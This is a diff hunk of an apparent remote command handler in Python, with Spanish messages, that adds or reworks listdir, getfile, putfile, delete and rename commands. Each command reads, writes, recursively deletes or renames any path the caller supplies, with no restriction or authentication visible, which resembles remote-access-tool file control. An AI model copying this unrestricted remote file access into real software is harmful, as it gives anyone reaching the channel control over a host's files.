@@ -197,27 +197,73 @@ async def handle_command(payload):
         except Exception as e:
             return {"ok": False, "msg": str(e)}
 
+    elif cmd == "listdir":
+        path = args.get("path")
+        if not path or not os.path.exists(path):
+            return {"ok": False, "msg": f"Ruta inválida: {path}"}
+        try:
+            items = []
+            for entry in os.listdir(path):
+                full = os.path.join(path, entry)
+                items.append(
+                    {
+                        "name": entry,
+                        "is_dir": os.path.isdir(full),
+                        "size": os.path.getsize(full) if os.path.isfile(full) else 0,
+                    }
+                )
+            return {"ok": True, "data": {"path": path, "items": items}}
+        except Exception as e:
+            return {"ok": False, "msg": str(e)}
+
     elif cmd == "getfile":
         path = args.get("path")
         if not path or not os.path.isfile(path):
-            return {"ok": False, "msg": "Archivo no encontrado"}
+            return {"ok": False, "msg": "Archivo no válido"}
         try:
             with open(path, "rb") as f:
-                data = base64.b64encode(f.read()).decode()
-            return {"ok": True, "data": data}
+                data = f.read()
+            import base64
+
+            return {"ok": True, "data": base64.b64encode(data).decode()}
         except Exception as e:
             return {"ok": False, "msg": str(e)}
 
     elif cmd == "putfile":
         path = args.get("path")
-        data = args.get("data")
-        if not path or data is None:
-            return {"ok": False, "msg": "Parámetros inválidos"}
+        content = args.get("content")
+        if not path or not content:
+            return {"ok": False, "msg": "Parámetros faltantes"}
         try:
-            raw = base64.b64decode(data.encode())
+            import base64
+
             with open(path, "wb") as f:
-                f.write(raw)
-            return {"ok": True, "msg": "Archivo guardado correctamente"}
+                f.write(base64.b64decode(content))
+            return {"ok": True, "msg": "Archivo escrito"}
+        except Exception as e:
+            return {"ok": False, "msg": str(e)}
+
+    elif cmd == "delete":
+        path = args.get("path")
+        if not path or not os.path.exists(path):
+            return {"ok": False, "msg": "Archivo o carpeta no existe"}
+        try:
+            if os.path.isdir(path):
+                shutil.rmtree(path)
+            else:
+                os.remove(path)
+            return {"ok": True, "msg": "Eliminado correctamente"}
+        except Exception as e:
+            return {"ok": False, "msg": str(e)}
+
+    elif cmd == "rename":
+        src = args.get("src")
+        dst = args.get("dst")
+        if not src or not dst or not os.path.exists(src):
+            return {"ok": False, "msg": "Rutas inválidas"}
+        try:
+            os.rename(src, dst)
+            return {"ok": True, "msg": "Renombrado correctamente"}
         except Exception as e:
             return {"ok": False, "msg": str(e)}
 
